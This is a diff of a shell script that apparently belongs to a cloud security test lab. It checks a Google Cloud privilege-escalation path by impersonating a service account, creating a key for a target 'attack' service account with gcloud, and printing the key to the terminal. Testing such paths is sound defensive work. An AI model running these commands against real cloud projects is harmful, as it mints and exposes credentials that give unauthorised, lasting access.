@@ -3,18 +3,18 @@
 source lib/lib.sh
 
 echo "================================================"
-echo "Checking iam.roles.update"
+echo "Checking iam.serviceAccountKeys.create"
 
-modify_role "iam.roles.update,iam.roles.get"
+modify_role "iam.serviceAccountKeys.create"
 
 
 gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
-  iam roles update "$ROLE_NAME" --project "$PROJECT_ID" --add-permissions "iam.serviceAccountKeys.create"
+  iam service-accounts keys create /tmp/privesc_check --iam-account "${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"
 
-
+cat /tmp/privesc_check
+rm /tmp/privesc_check
 # Cleaning
-gcloud iam roles describe "$ROLE_NAME" --project "$PROJECT_ID"
-echo "The role 'iam.serviceAccountKeys.create' should have been granted"
+echo "You should see a token previos to this message"
 read -p "Press any key to delete scenario... " -n1 -s
 echo ""
 
